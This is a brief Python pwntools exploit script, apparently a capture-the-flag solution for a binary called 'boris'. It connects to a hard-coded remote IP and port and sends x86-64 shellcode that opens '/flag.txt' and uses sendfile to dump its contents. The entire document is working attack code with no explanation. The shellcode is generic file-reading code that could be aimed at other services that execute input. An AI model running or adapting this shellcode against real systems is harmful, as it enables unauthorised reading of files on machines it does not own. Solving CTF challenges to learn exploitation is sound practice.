from pwn import *

elf = ELF('boris')
context.update(arch='amd64', os='linux', binary=elf)

host = '193.57.159.27'
port = 29345

shellcode = """
push 0x74
mov rax, 0x78742e67616c662f
push rax
push 0x101
pop rax
mov edi, 0xffffffffffffff9c
mov rsi, rsp
cdq
xor rcx, rcx
syscall
mov r10d, 0x7fffffff
mov rsi, rax
push 0x28 
pop rax
push 1
pop rdi
cdq
syscall
"""

payload = asm(shellcode)

if args.LOCAL:
	p = elf.process()
else:
	p = remote(host, port)

p.sendline(payload)

p.interactive()

p.close()